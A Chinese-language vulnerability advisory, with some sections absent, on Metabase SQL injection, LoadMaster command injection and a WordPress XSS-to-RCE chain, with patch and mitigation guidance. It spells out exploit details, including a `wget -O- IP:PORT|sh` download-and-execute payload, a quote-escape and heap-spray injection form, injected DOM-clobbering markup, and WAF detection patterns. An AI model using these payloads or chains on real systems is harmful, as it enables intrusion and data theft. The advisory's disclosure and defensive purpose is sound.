### 3.1 Metabase 未认证 SQL 注入零日（GHSA-vwf4-m7j8-wcjf） — 管理员接管与连接库数据窃取

#### 3.1.2 漏洞摘要

该漏洞存在于 Metabase 密码重置接口 `/api/session/reset_password`。Metabase 是一款开源商业智能（BI）与数据分析平台，通常直连企业数据仓库。官方通告确认：**未认证远程攻击者可通过该接口向 Metabase 应用数据库注入任意 SQL**，从而获得实例管理员权限；此后攻击者可修改应用配置、窃取所有已连接数据库的存储凭据、读取这些连接可达的数据并导出。对企业而言，BI 平台直连核心数仓，爆破半径接近最坏情况。

该漏洞以**真实零日**形态被利用：攻击者在 Metabase 自身发现之前已将其用于攻击 Metabase Cloud，官方在通告中确认"利用的是 1.58 及以上版本中未知（0-day）漏洞"，随即封禁被滥用端点并完成修复；公告发布时 Cloud 实例已全部运行修复版本。**自托管实例需自行升级**。实际受害者包括：PC 厂商 Framework（姓名、邮箱、登录 IP、账单/收货地址、电话号码、公司名称泄露，订单与支付信息未受影响）与 Tally（邮箱与密码哈希被访问，表单与响应数据因位于独立系统未受影响）。官方同时公布了中招特征：日志中出现"`POST /api/session/reset_password` 返回 400，随后 `GET /api/user/current` 返回 200"的序列，即视为实例已被攻破。

> 官方通告建议：自托管实例尽快升级至对应安全版本；无法立即升级的临时缓解措施为在网络层阻断 `/api/session/reset_password` 端点；若该端点曾公网可达，升级后还须清除会话、审计 API Key 与管理员账户、轮换连接库凭据并检查数仓日志。

#### 3.1.5 利用条件与技术原理

| 条件 | 状态 | 说明 |
| --- | --- | --- |
| 网络可达 | 是 | 攻击者需可达 Metabase HTTP API（密码重置接口公网暴露） |
| 身份认证 | 无需 | 未认证触发（PR:N） |
| 用户交互 | 不需要 | 全程无用户参与 |
| 特定配置 | 是 | 默认配置即受影响；应用数据库中存储的高权限连接库凭据会放大影响范围 |
| 利用复杂度 | 低 | NVD 向量 AC:L（官方评分为 10.0） |

**技术原理：**

密码重置接口 `/api/session/reset_password` 在处理输入并构造 SQL 语句时缺乏参数化处理与输入校验，未认证攻击者可向该接口提交精心构造的请求，将任意 SQL 注入 Metabase 应用数据库（元数据库）。注入成功后攻击者可直接在应用数据库中提升/创建管理员上下文，随后以管理员身份调用管理功能：枚举并窃取各连接数据库的存储凭据、查询并导出数据、修改应用配置或账户以维持访问。

**核心利用链：**

```text
攻击者
  └─ 发现互联网暴露的 Metabase 实例（0.58~0.63 受影响分支）
      └─ 向 /api/session/reset_password 发送构造的 POST 请求（注入 SQL）
          └─ 任意 SQL 在 Metabase 应用数据库中执行
              └─ 获取实例管理员权限（GET /api/user/current 返回 200 验证）
                  └─ 枚举并窃取已连接数据库的存储凭据
                      └─ 查询/导出业务数据，修改配置或创建后门账户维持访问
```

#### 3.2.5 利用条件与技术原理

| 条件 | 状态 | 说明 |
| --- | --- | --- |
| 网络可达 | 是 | 攻击者需可达 LoadMaster 管理 API（`POST /accessv2`，通常位于 443 端口） |
| 身份认证 | 无需 | 预认证触发（PR:N） |
| 用户交互 | 不需要 | 全程无用户参与 |
| 特定配置 | 是 | 需启用 API 功能；管理接口暴露于攻击者可达网络 |
| 利用复杂度 | 低 | NVD 向量 AC:L |

**技术原理：**

管理 API 的命令端点将用户可控输入拼接进系统命令，且引号过滤函数 `escape_quotes()` 对连续引号输入（如 `''''`）的处理存在缺陷（未正确 null 终止，对应未初始化堆内存问题）：攻击者以 `"apiuser": "''''"` 触发该缺陷绕过转义，随后在请求 JSON 中填充 `g0`~`g60` 共 61 个字段进行堆喷射，将 `'; <命令> #` 形式的载荷布局到相邻堆块（`#` 注释掉后续内容），最终该串被传入 `system()` 以 root 权限执行。命令长度受限（不带 echo 标签时约 34 字符），公开 PoC 使用 `wget -O- IP:PORT|sh` 等短载荷完成下载执行与反弹 Shell。利用成功后可完全控制负载均衡设备，进而劫持其代理的南北向流量。

**核心利用链：**

```text
攻击者
  └─ 发现暴露的 LoadMaster 管理 API（POST /accessv2）
      └─ apiuser="''''" 触发 escape_quotes() 引号转义缺陷（未 null 终止）
          └─ g0~g60 共 61 次堆喷射布局载荷
              └─ '; <命令> # 闭合上下文并注释后续
                  └─ system() 以 root 权限执行任意命令
                      └─ 下载执行载荷 / 反弹 Shell / 植入持久化后门
```

#### 3.3.2 漏洞摘要

该漏洞存在于 WordPress 登录页（`wp-login.php`）的错误回显处理流程中。当用户提交不存在的用户名时，WordPress 通过 `wp_signon()` → `wp_authenticate()` 生成错误信息，将用户提交的用户名原样回显；回显前先经 PHP `strip_tags()` 过滤 HTML 标签，再经 WordPress 自身的 `wp_kses_post()` 净化。两个净化器对标签的解析规则不一致：`strip_tags()` 仅识别"`<` 后紧跟字母"的标签，`< area id=ajaxurl>` 这类尖括号后带空格的字符串可完整绕过；而 `wp_kses_post()` 的解析器容忍该空白，将其视为合法的 `<area>` 元素输出为真实 HTML，形成反射型 XSS。

Pwn 研究团队进一步利用浏览器"命名属性"特性（window 对象暴露所有带 `id` 属性的 HTML 元素）实现 **DOM clobbering**：注入的 `<area id=ajaxurl>` 覆盖 WordPress 登录页加载的 `user-profile.js`（本用于个人资料页，因登录页同时承担密码重置功能被一并加载）中未定义的 `ajaxurl` 变量，配合 `#color-picker` 等注入元素，脚本会自动向攻击者控制的 URL 发起请求。通过 REST API 的 `_jsonp` 回调（接受点号，可跨窗口遍历属性链）与 2022 年公开的跨窗口点击技术，攻击者可在一个隐藏窗口中打开 WordPress 应用密码审批页，并在已登录管理员的真实会话中自动点击"批准"，从而获取管理员 Application Password。该密码可经 REST API 的 HTTP Basic 认证从任意来源调用；单站点管理员默认具备 `unfiltered_html` 权限，可发布含攻击脚本的页面并上传恶意插件，最终以 Web 服务用户权限执行任意 PHP 命令。整条链路预认证触发、受害者仅需访问攻击者页面（无需点击），PoC 已证明可对默认配置 WordPress 实现 RCE 并自动清理痕迹。

> 该漏洞自 WordPress 早期版本即存在，影响所有受维护分支，覆盖全球超 43% 互联网网站（估计 5 亿+ 站点）。2026-07-26 由 Pwn 团队发现并完整复现，07-27 报告 WordPress，官方 08-06 紧急发布 7.0.3 并将修复回溯至 4.7 起所有受维护分支。NVD 描述亦指出：RCE 阶段的达成需要受害者（已登录管理员）成功的社会工程诱导与明确交互（UI:A），与 Pwn 披露的利用条件一致。

#### 3.3.5 利用条件与技术原理

| 条件 | 状态 | 说明 |
| --- | --- | --- |
| 网络可达 | 是 | 攻击者需互联网可达的 WordPress 站点及受害者浏览器 |
| 身份认证 | 无需 | 预认证触发（PR:N）；RCE 阶段需受害者为已登录管理员（UI:A） |
| 用户交互 | 需要 | 受害者需访问攻击者构造的恶意页面（UI:A）；无需点击 |
| 特定配置 | 否 | 默认配置即受影响；单站点管理员默认具备 `unfiltered_html` 权限 |
| 利用复杂度 | 高 | NVD 向量 AC:H（RCE 需管理员在线访问页面等条件配合） |

**技术原理：**

根本原因为两个净化器解析不一致导致的输入校验缺失：`strip_tags()`（按"`<`+字母"识别标签）与 `wp_kses_post()`（容忍尖括号后空白）对同一字符串给出不同结果，使 `< area id=...>` 绕过首层过滤并以合法元素输出。随后利用浏览器命名属性机制（HTML 规范 7.3.3：带 `id` 的元素成为 `window` 的属性）进行 DOM clobbering，劫持登录页 `user-profile.js` 中未定义的 `ajaxurl` 变量，形成无需用户点击的自动请求；再经 REST API `_jsonp` 回调（校验 `^[a-zA-Z0-9_.]+$`，允许点号遍历属性链）与跨窗口点击技术，在管理员真实会话中自动批准应用密码申请，最终借 `unfiltered_html` 权限发布恶意页面并上传插件实现代码执行。

**核心利用链：**

```text
攻击者
  └─ 构造恶意页面（表单自动提交至 TARGET/wp-login.php）
      └─ 提交不存在用户名，携带 < area id=ajaxurl href=...>< div id=color-picker ...>< button ...>
          └─ strip_tags() 放行 → wp_kses_post() 输出真实 HTML（反射型 XSS）
              └─ DOM clobbering 劫持 user-profile.js 的 ajaxurl
                  └─ REST API _jsonp 回调跨窗口遍历属性链（window.opener.approve.click）
                      └─ 在管理员会话中自动批准 Application Password
                          └─ 经 REST API Basic 认证发布恶意页面、上传恶意插件
                              └─ 以 Web 服务用户权限执行任意 PHP 代码（RCE）
```

#### 3.3.11 风险影响

漏洞成功利用后，可能导致：

- 在 WordPress 源执行任意 JavaScript（XSS），窃取会话或伪造页面；
- 获取管理员 Application Password，接管 WordPress 管理权限；
- 以 Web 服务用户权限远程执行任意 PHP 代码（RCE）；
- 篡改站点页面与内容，植入恶意脚本或后门；
- 窃取数据库凭据、配置与业务数据；
- 以站点为跳板横向移动至同服务器其他应用；
- 大规模站点被批量利用形成供应链投毒或挂马网络。

#### 3.3.13 修复与缓解措施

#### 官方修复

1. 将 WordPress 升级至 `7.0.3` 或所属受维护分支（4.7 起）的最新安全版本（管理后台"更新"页面或[官方下载](https://wordpress.org/download/)）；
2. 无法直接升级的，等待并安装对应分支的安全补丁（官方已回溯修复所有受维护分支）；
3. 升级前完成站点文件、数据库与配置备份；
4. 在测试环境验证插件/主题兼容性及回退方案；
5. 升级后核验版本号、登录页与 REST API 功能正常；
6. 对曾暴露且未及时修复的站点按失陷假设开展日志与文件排查。

#### 临时缓解

无法立即升级时，可采取：

- 在 WAF/网关对 `/wp-login.php` 的 `log` 参数增加 XSS 注入特征拦截规则（`< area`、`< div`、`< button`、`reset-pass-submit` 等特征）；
- 临时禁用 Application Passwords 功能（`wp-config.php` 中 `define( 'WP_APPLICATION_PASSWORDS', false );`，注意会一并影响正常 API 应用）；
- 限制管理后台与登录页的访问来源（IP 白名单、VPN）；
- 加强登录审计与文件完整性监控；
- 对高风险站点实施网络隔离或访问收敛。

## 五、当日处置建议

1. **Metabase 自托管实例立即升级（P0）**：24 小时内升级至所属分支修复版本 `0.58.24` / `0.59.21` / `0.60.17` / `0.61.11` / `0.62.9` / `0.63.5`；无法立即升级的，在网络层阻断 `/api/session/reset_password` 端点；曾公网暴露的实例升级后按官方清单清空 `core_session` 会话、审计 API Key 与管理员账户、轮换所有连接数据库凭据。
2. **LoadMaster 设备立即升级（P0）**：升级至 `GA v7.2.63.2` / `LTSF v7.2.54.18` 及以上；无法立即升级的收敛管理 API 网络暴露（仅管理网段可达）、在 WAF/IPS 增加 `/accessv2` 命令注入特征拦截规则。
3. **核查在野利用与 KEV 覆盖**：对照 [CISA KEV 目录](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)（本期新增 CVE-2026-8037，dateAdded 2026-08-07）开展资产排查，联邦/受监管机构须于 2026-08-10 前完成修复。
4. **全部 WordPress 站点立即升级（P0）**：奇安信 CERT 已确认复现 CVE-2026-64638（XSS2Shell），公开 PoC 已出现，未升级站点尽快升级至 7.0.3（或所属受维护分支最新安全版本）；无法立即升级的在 WAF 拦截登录页 `log` 参数注入特征。
5. 对疑似遭受攻击的系统保留日志、流量、进程、文件及内存证据；Metabase 重点检查密码重置接口 400→200 特征序列与连接库异常查询，LoadMaster 重点检查 `/accessv2` 异常请求与反弹连接，WordPress 重点检查登录页注入特征与异常 Application Password 记录。
6. 完成修复后进行复测，并更新资产台账和漏洞处置记录；本期三个漏洞均有官方补丁，无"暂无补丁"项。
